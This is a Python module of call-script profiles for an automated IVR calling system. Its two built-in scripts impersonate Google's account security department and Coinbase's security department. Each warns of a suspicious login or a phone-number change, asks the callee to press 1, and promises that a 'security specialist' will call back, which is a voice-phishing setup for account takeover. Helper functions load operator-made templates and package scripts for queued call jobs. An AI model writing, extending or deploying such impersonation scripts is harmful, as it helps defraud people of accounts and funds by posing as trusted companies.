"""
Script profile definitions for P1 IVR calls.

Lightweight module — no audio/numpy/websocket dependencies.
Safe to import on controller nodes that have no audio stack.
"""

SCRIPT_PROFILES = {
    "suspicious": {
        "label": "\U0001f7e0 Security Alert",
        "intro": (
            "suspicious_intro1.pcm",
            "Hello. This is an AI-powered automated voice call on behalf of the Google"
            "Account Security Department. We are reaching out regarding a suspicious "
            "login attempt associated with your account. The login originated "
            "from Richmond, Virginia, using a Samsung Galaxy S23 device. If you did "
            "not initiate this login attempt and wish to block the request, please "
            "press 1 now. If you did initiate this attempt, please press 2."
        ),
        "pressed_1": (
            "suspicious_pressed_1.pcm",
            "Thank you for confirming this suspicious activity. Your account has been "
            "flagged for immediate security review. A security specialist will "
            "contact you shortly to assist with securing your account. There is no "
            "need to take any further action until you receive this follow-up call. "
            "Please keep your phone available. Your account security is our utmost priority."
        ),
        "pressed_2": (
            "suspicious_pressed_2.pcm",
            "Thank you for confirming. This login request has been authorized and no "
            "further action is required at this time. If you did not intend to approve "
            "this activity or notice anything unusual, please review your account "
            "security settings. Thank you for helping us keep your account secure."
        ),
        "no_response": (
            "suspicious_no_response.pcm",
            "We did not receive a response. No changes have been made to your account "
            "at this time. If you need assistance, please review your account security "
            "settings. Thank you."
        ),
        "retry": (
            "suspicious_retry.pcm",
            "It seems like you did not respond. As a reminder, press 1 if you did not "
            "initiate this login and wish to block the request. Press 2 if you did "
            "initiate this login attempt."
        ),
    },
    "coinbase": {
        "label": "\U0001f535 Coinbase Security",
        "intro": (
            "coinbase_intro.pcm",
            "Hello. This is an automated call from the Coinbase security department. "
            "We have detected an attempt to change the primary phone number assigned "
            "to your account. If this was not you, please press 1. If this was you, "
            "please press 2."
        ),
        "pressed_1": (
            "coinbase_pressed_1.pcm",
            "Thank you for alerting us. We have blocked the phone number change request "
            "and your account has been temporarily locked for your protection. A Coinbase "
            "security specialist will contact you shortly to verify your identity and "
            "restore full access. Please keep your phone available."
        ),
        "pressed_2": (
            "coinbase_pressed_2.pcm",
            "Thank you for confirming. The phone number change has been authorized. If "
            "you did not intend to make this change or notice anything unusual, please "
            "review your account security settings immediately. Thank you."
        ),
        "no_response": (
            "coinbase_no_response.pcm",
            "We did not receive a response. The phone number change request remains "
            "pending. If you need assistance, please contact Coinbase support or review "
            "your account security settings. Thank you."
        ),
        "retry": (
            "coinbase_retry.pcm",
            "It seems like you did not respond. As a reminder, press 1 if you did not "
            "request this phone number change and wish to block it. Press 2 if this "
            "change was authorized by you."
        ),
    },
}

DEFAULT_PROFILE = "suspicious"

SCRIPT_SLOTS = ("intro", "pressed_1", "pressed_2", "no_response", "retry")

SLOT_LABELS = {
    "intro": "Intro",
    "pressed_1": "Pressed 1",
    "pressed_2": "Pressed 2",
    "no_response": "No answer",
    "retry": "Retry",
}


def _slot_filename(key: str, slot: str, text: str) -> str:
    import hashlib
    digest = hashlib.sha1((text or "").encode("utf-8")).hexdigest()[:10]
    safe = "".join(c if c.isalnum() or c in "-_" else "_" for c in (key or "x"))[:24]
    return f"{safe}_{slot}_{digest}.pcm"


def normalize_profile(key: str, raw: dict) -> dict:
    """Every spoken slot is (cache_filename, text) — what the IVR player expects."""
    raw = raw or {}
    out = {"key": key, "label": raw.get("label") or key}
    for slot in SCRIPT_SLOTS:
        val = raw.get(slot)
        if isinstance(val, (list, tuple)) and len(val) >= 2:
            out[slot] = (str(val[0]), str(val[1]))
        else:
            text = "" if val is None else str(val)
            out[slot] = (_slot_filename(key, slot, text), text)
    return out


def serialize_bundle(key: str, profile: dict) -> dict:
    """JSON-safe texts for Redis job params (agents have no custom JSON)."""
    profile = profile or {}
    out = {"key": key, "label": profile.get("label") or key}
    for slot in SCRIPT_SLOTS:
        val = profile.get(slot)
        if isinstance(val, (list, tuple)) and len(val) >= 2:
            out[slot] = val[1]
        else:
            out[slot] = val or ""
    return out


def profile_from_bundle(bundle: dict) -> dict:
    if not bundle:
        return SCRIPT_PROFILES[DEFAULT_PROFILE]
    key = bundle.get("key") or bundle.get("name") or "custom"
    return normalize_profile(key, bundle)


def resolve_profile(key: str, bundle: dict | None = None) -> dict:
    """Built-in, operator-made, or an explicit job bundle — always normalized."""
    if bundle:
        return profile_from_bundle(bundle)
    if key in SCRIPT_PROFILES:
        return SCRIPT_PROFILES[key]
    try:
        from storage.script_templates import get_custom_sync
        custom = get_custom_sync(key)
        if custom:
            return normalize_profile(key, custom)
    except Exception:
        pass
    return SCRIPT_PROFILES[DEFAULT_PROFILE]


def profile_label(key: str, bundle: dict | None = None) -> str:
    return resolve_profile(key, bundle).get("label") or key or "?"
